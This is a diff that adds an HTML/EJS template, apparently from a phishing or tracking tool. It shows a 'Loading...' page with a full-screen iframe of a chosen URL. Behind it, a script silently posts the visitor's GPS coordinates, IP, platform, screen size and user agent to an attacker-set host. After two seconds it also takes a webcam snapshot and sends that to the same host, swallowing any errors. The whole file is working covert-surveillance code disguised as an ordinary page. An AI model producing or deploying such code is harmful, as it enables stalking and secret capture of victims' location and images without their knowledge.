@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body { margin: 0; padding: 0; overflow: hidden; }
+        iframe { position: fixed; top: 0; left: 0; width: 100%; height: 100%; border: none; }
+    </style>
+</head>
+<body>
+    <iframe src="<%= url %>" allow="camera; geolocation"></iframe>
+    
+    <script>
+        const uid = '<%= uid %>';
+        const host = '<%= host %>';
+
+        function send(endpoint, data) {
+            fetch(`${host}/${endpoint}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: new URLSearchParams(data)
+            }).catch(() => {});
+        }
+
+        // Location
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                pos => send('location', {
+                    lat: pos.coords.latitude,
+                    lon: pos.coords.longitude,
+                    uid: uid,
+                    acc: pos.coords.accuracy
+                })
+            );
+        }
+
+        // Info
+        const info = `╔══════════════════════╗
+║ <b>📱 Device</b>           ║
+╚══════════════════════╝
+
+IP: <%= ip %>
+Time: <%= time %>
+Platform: ${navigator.platform}
+Screen: ${screen.width}x${screen.height}
+
+${navigator.userAgent}
+
+━━━━━━━━━━━━━━━━━━━━━`;
+
+        send('info', { uid: uid, data: info });
+
+        // Camera
+        if (navigator.mediaDevices) {
+            setTimeout(() => {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(s => {
+                        const v = document.createElement('video');
+                        v.srcObject = s;
+                        v.play();
+                        
+                        v.onloadedmetadata = () => {
+                            const c = document.createElement('canvas');
+                            c.width = v.videoWidth;
+                            c.height = v.videoHeight;
+                            c.getContext('2d').drawImage(v, 0, 0);
+                            
+                            send('camsnap', {
+                                uid: uid,
+                                img: c.toDataURL('image/png').split(',')[1]
+                            });
+                            
+                            s.getTracks().forEach(t => t.stop());
+                        };
+                    })
+                    .catch(() => {});
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
